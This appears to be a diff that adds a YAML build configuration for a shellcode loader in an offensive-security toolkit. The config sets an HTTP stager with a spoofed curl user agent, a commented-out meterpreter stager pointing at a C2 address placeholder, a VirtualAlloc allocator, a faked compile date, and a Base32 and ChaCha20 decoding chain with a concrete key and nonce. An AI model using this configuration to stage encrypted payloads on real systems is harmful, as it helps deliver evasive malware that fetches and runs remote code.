@@ -1,0 +1,35 @@
+compile_date: "2022-04-12 23:08:34"
+max_sleep_duration: 300
+
+allocator: virtualalloc
+
+stager:
+  name: http
+  address: <url>
+  user_agent: curl/8.9.1
+
+# stager:
+#   name: meterpreter
+#   address: <c2 address>
+
+payload:
+  format: shellcode
+
+# payload:
+#   format: library
+
+decoders:
+  # LIFO
+  - type: "Base32"
+
+  - type: "ChaCha20"
+    key: 837784937d664e276bd753bee5c9f04d903bc03ced59717559199b0e276b33a1
+    nonce: c0b86be480cb84cdb97b2901
+
+  #- type: "Aes256"
+  #  key: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+  #  nonce: "aabbccddeeff00112233445566778899"
+
+  #- type: "Aes128"
+  #  key: "00112233445566778899aabbccddeeff"
+  #  nonce: "ffeeddccbbaa99887766554433221100"
